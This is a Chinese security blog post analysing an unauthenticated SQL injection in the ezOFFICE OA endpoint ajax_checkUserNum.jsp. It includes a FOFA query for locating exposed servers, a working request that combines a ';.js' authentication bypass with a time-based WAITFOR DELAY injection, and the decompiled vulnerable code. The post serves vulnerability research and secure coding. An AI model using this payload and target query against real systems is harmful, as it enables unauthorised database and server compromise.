---
title: "万户OA ajax_checkUserNum.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html
asset_dir: assets/万户oa-ajax_checkusernum.jsp-sql注入漏洞
---

# 万户OA ajax\_checkUserNum.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/6 20:27
- 1883浏览
- [0评论](#comment)
- 1小时阅读

深入探索

SQL

认证

sql

---

# 0x01 产品简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

# 0x02 漏洞概述

万户 ezOFFICE ajax\_checkUserNum.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")获取数据库权限，深入利用可获取服务器权限。

# 0x03 复现环境

本地环境 OR FOFA：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

# 漏洞复现

```
GET /defaultroot/modules/hrm/hr/employee/ajax_checkUserNum.jsp;.js?add=0&empId=1%1eWAITFOR%1eDELAY%1e'0:0:5' HTTP/1.1
Host: 192.168.22.187:7001
```

延时 5 秒  
[[![万户OA ajax_checkUserNum.jsp SQL注入漏洞](images/img-001-20677f7cd280.png)](https://mrxn.net/content/uploadfile/202501/94531736167392.png)](https://mrxn.net/content/uploadfile/202501/94531736167392.png)

延时 3 秒  
[[![万户OA ajax_checkUserNum.jsp SQL注入漏洞](images/img-002-81d0b8f66735.png)](https://mrxn.net/content/uploadfile/202501/0c491736167396.png)](https://mrxn.net/content/uploadfile/202501/0c491736167396.png)

# 漏洞分析

深入探索

授权

代码安全审计

Web安全书籍

## 万户 ezOFFICE 鉴权

其主要过滤逻辑在 `SetCharacterEncodingFilter` 类的 `doFilter` 来实现，代码如下：

```
public void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3) throws IOException, ServletException {
        HttpServletResponse var4 = (HttpServletResponse)var2;
        HttpServletRequest var5 = (HttpServletRequest)var1;
        PropertiesUtil.getInstance(var5);
        String var6 = PropertiesUtil.getInstance(var5).getRootPath();
        boolean var7 = false;
        SecurityList var8 = SecurityList.getInstance();
        String var9 = var5.getRequestURI();
        String var10 = var5.getContextPath();
        String var11 = var9.substring(var10.length());
        if (var11.indexOf("/iWebOfficeSign/OfficeServer.jsp") >= 0) {
            var3.doFilter(var1, var2);
        } else {
            if (this.ignore || var1.getCharacterEncoding() == null) {
                String var12 = this.selectEncoding(var1);
                if (var12 != null) {
                    var1.setCharacterEncoding(var12);
                }
            }

            if (var11.indexOf("/xfservices/GeneralWeb") < 0 && var11.indexOf("/services/ExchangeService") < 0) {
                UrlrewriteUtil var22 = new UrlrewriteUtil();
                String var13 = var5.getParameter("whir_new_verifyCode") == null ? "" : var5.getParameter("whir_new_verifyCode").toString();
                String var14 = var22.createNewUrl(var11, var5);
                if (var14 != null && !var14.equals("")) {
                    var4.sendRedirect(var6 + var14);
                    return;
                }

                String var15 = "";
                String var16 = "";
                if (var11.lastIndexOf(".") >= 0) {
                    var16 = var11.substring(var11.lastIndexOf("."));
                }

                if (var16 != null && var16.toLowerCase().equals(".jspx")) {
                    var4.sendRedirect(var6 + "/login.jsp");
                    return;
                }

                HttpSession var17 = var5.getSession();
                if ((var16.equals("") || var16.equals(".jsp") || var16.equals(".vm")) && this.needSecurity && var11.indexOf("/evo/weixin/") < 0 && var11.indexOf("/portal/") < 0 && var11.indexOf("/upgrade/") < 0 && var11.indexOf("/public/edit/") < 0 && !var8.getNosessionWhiteList().contains(var11)) {
                    if (var17.getAttribute("userId") == null || var17.getAttribute("userId").toString().equals("") || var17.getAttribute("userId").toString().equals("null")) {
                        if (var11.indexOf("/evo/sp/") >= 0) {
                            var4.sendRedirect(var6 + "/evo/sp/login.jsp");
                        } else {
                            var4.sendRedirect(var6 + "/public/messages/overtime.jsp");
                        }

                        logger.error("session 过滤 为空的请求：" + var11);
                        return;
                    }

                    String var18 = var17.getAttribute("userId").toString();
                    String var19 = var5.getParameter("common_whir_formUserId");
                    if (var19 != null && !var19.equals("") && !var19.equals(var18)) {
                        var4.sendRedirect(var6 + "/login.jsp");
                        return;
                    }
                }

                if (var11.endsWith("/Logon!logon.action") && this.needSecurity && !var11.equals("/Logon!logon.action")) {
                    var4.sendRedirect(var6 + "/public/messages/illegal.jsp");
                    return;
                }

                if (var5.getHeader("referer") != null) {
                    var15 = var5.getHeader("referer");
                } else {
                    var7 = true;
                }

                if (var7 && this.needSecurity && !var13.equals("1") && (var16.equals("") || var16.equals(".jsp") || var16.equals(".vm") || var16.equals(".acion")) && var11.indexOf("/evo/weixin/") < 0 && var11.indexOf("/portal/") < 0 && var11.indexOf("/upgrade/") < 0 && var11.indexOf("/public/edit/") < 0 && !var8.getPageWhiteList().contains(var11)) {
                    logger.debug("request_shorturi3:" + var11);
                    String var24 = var1.getRemoteAddr();
                    var8.addPageWhiteList_bar(var11, var24);
                    var5.getRequestDispatcher("/login.jsp").forward(var1, var2);
                    return;
                }

                if (var7) {
                    if (!var8.getPageWhiteList().contains(var11)) {
                    }
                } else {
                    boolean var23 = false;
                    List var25 = var8.getServiceWhiteList();
                    if (var25 != null && var25.size() > 0) {
                        for(int var20 = 0; var20 < var25.size(); ++var20) {
                            if (var15.startsWith("" + var25.get(var20))) {
                                var23 = true;
                            }
                        }
                    }

                    if (!var23) {
                    }
                }

                var3.doFilter(var1, var2);
            } else {
                if (!this.judgeIsSecurityIP((HttpServletRequest)var1)) {
                    return;
                }

                MAPIHttpServletRequestWrapper var21 = new MAPIHttpServletRequestWrapper((HttpServletRequest)var1);
                if (var21.haveXXE()) {
                    return;
                }

                var3.doFilter(var21, var2);
            }

        }
    }
```

其中两个关键点如下

- 通过 `String var9 = var5.getRequestURI();` 获取 `url` 存在缺陷，可以使用;.js来绕过下面获取文件后缀判断从而绕过 为jsp时的鉴权。
- 如果请求路径包含/iWebOfficeSign/OfficeServer.jsp，直接放行请求。（这也是网上很多POC里用到的方式之一）

## sql注入部分

文件源码如下，进行简单的[~~代码审计~~](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1 "代码审计")

```
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
response.setHeader("Cache-Control","no-store");
response.setHeader("Pragma","no-cache");
response.setDateHeader ("Expires", 0);

String add = request.getParameter("add");//1--添加新用户，2--修改用户
String message = ",不能恢复删除的用户！";
if("1".equals(add)){
    message = ",不能添加新用户！";
}else if("2".equals(add)){
    message = ",不能修改该用户！";
}

com.whir.common.init.DogManager dm = com.whir.common.init.DogManager.getInstance();
String[] dogInfo = (String[]) dm.getDogkey(); 
String empId = request.getParameter("empId");
com.whir.ezoffice.customdb.common.util.DbOpt dbopt = null;
try{
    dbopt = new com.whir.ezoffice.customdb.common.util.DbOpt(); 

    String userAccounts = dbopt.executeQueryToStr("select USERACCOUNTS from org_employee where emp_id="+empId);
    if(userAccounts!=null&&!"".equals(userAccounts)&&!"null".equals(userAccounts)){
        String sql = "select count(emp_id) from org_employee where domain_id="+session.getAttribute("domainId")+" and USERISDELETED=0 and USERACCOUNTS is not null and USERACCOUNTS <> ' '";
        String num = dbopt.executeQueryToStr(sql);

        if(dogInfo!=null&&!"".equals(dogInfo[1])){
            if(Integer.parseInt(num)>=Integer.parseInt(dogInfo[1])){
                out.print("当前用户数"+num+",授权用户数"+dogInfo[1]+message);
            }
        }
    }

    dbopt.close();
}catch(Exception ee){
    ee.printStackTrace();
}finally{
    dbopt.close();
}
%>
```

朴实无华的sql拼接：通过 `request.getParameter` 获取 `empId` 值后直接拼接进sql语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，`add` 参数可有可无。

# 最后

安全编码，针对获取 `url` 请使用 `getServletPath()` 来处理 ! 不要使用 `getRequestURL()` 或者 `getRequestURI()`！

其他万户OA 相关漏洞  
[万户 ezOFFICE selectAmountField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html)  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

# 参考

- `https://xz.aliyun.com/t/15390`
- `https://xz.aliyun.com/t/7544`
- `https://www.cnblogs.com/depycode/p/16124191.html`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---

文章目录

- [1.0x01 产品简介](#toc-1-)
- [2.0x02 漏洞概述](#toc-2-)
- [3.0x03 复现环境](#toc-3-)
- [4.漏洞复现](#toc-4-)
- [5.漏洞分析](#toc-5-)
- [5.1.万户 ezOFFICE 鉴权](#toc-5-1-)
- [5.2.sql注入部分](#toc-5-2-)
- [6.最后](#toc-6-)
- [7.参考](#toc-7-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
